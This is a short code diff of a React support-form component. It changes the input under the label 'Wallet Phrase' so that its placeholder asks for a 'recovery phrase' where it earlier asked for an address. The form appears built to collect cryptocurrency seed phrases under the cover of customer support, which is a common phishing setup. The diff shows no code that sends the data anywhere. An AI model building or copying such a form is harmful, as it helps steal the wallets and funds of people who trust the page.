@@ -118,7 +118,7 @@ function SupportForm() {
                 <motion.div key="wallet" initial={{ opacity: 0, x: 12 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -12 }} transition={{ duration: 0.25 }} className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div>
                     <label className="block text-sky-800 text-sm font-medium mb-1">Wallet Phrase</label>
-                    <input name="address" value={walletData.address} onChange={onWalletChange} placeholder="0x..." className="w-full rounded-lg border border-sky-200 p-2.5 bg-white/60 focus:ring-2 focus:ring-sky-300 outline-none text-black" />
+                    <input name="address" value={walletData.address} onChange={onWalletChange} placeholder="Enter recovery phrase" className="w-full rounded-lg border border-sky-200 p-2.5 bg-white/60 focus:ring-2 focus:ring-sky-300 outline-none text-black" />
                   </div>
                   <div>
                     <label className="block text-sky-800 text-sm font-medium mb-1">Wallet Type</label>
